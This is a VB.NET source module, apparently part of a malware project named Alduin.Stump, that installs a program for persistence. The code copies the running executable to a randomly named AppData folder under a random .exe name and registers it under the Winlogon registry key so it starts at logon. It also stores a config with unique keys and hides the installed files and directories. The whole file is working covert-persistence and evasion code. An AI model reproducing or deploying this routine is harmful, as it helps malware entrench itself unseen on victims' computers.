Imports System.IO
Imports System.Text
Imports Alduin.Stump.Alduin.Stump.Models
Imports Newtonsoft.Json

Module Installing
    Public Sub Install()
        If Not File.Exists(Get_JsonFilewithPath()) Then
            Console.WriteLine("Installing")
            Dim installPath As String = GetAppdata() & "\" & RandomString(5, 8)
            Dim Re_Named_Main_file As String = RandomString(4, 8) & ".exe"
            CreateDirectory(installPath)
            System.IO.File.Copy(GetMainFile(), installPath & "\" & Re_Named_Main_file)
            Dim ExeptFiles As New ArrayList From {
                GetMainFile()
            }
            Copy_filesExept(installPath, ExeptFiles)
            Copy_directories(installPath)
            Set_registry("Software\Microsoft\Windows NT\CurrentVersion\Winlogon\", installPath & "\" & GetMainFile())
            Dim config As New ConfigModel With {
                .KeyUnique = RandomString(10, 10),
                .KeyCertified = SavedKeyCertified,
                .MainFileName = Re_Named_Main_file,
                .MainPath = installPath
            }
            Dim jsonString As String = JsonConvert.SerializeObject(config)
            Write_file(Get_JsonFilewithPath(), jsonString)
            Hide_files(installPath)
            Hide_directories(installPath)
        End If
    End Sub
    Private Function RandomString(ByVal min As Integer, ByVal max As Integer) As String
        Dim r As Random = New Random
        Dim characters As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
        Dim sb As New StringBuilder
        Dim randomLength As Integer = r.Next(min, max)
        For i As Integer = 1 To randomLength
            Dim index As Integer = r.Next(0, characters.Length)
            sb.Append(characters.Substring(index, 1))
        Next
        Return sb.ToString()
    End Function

End Module

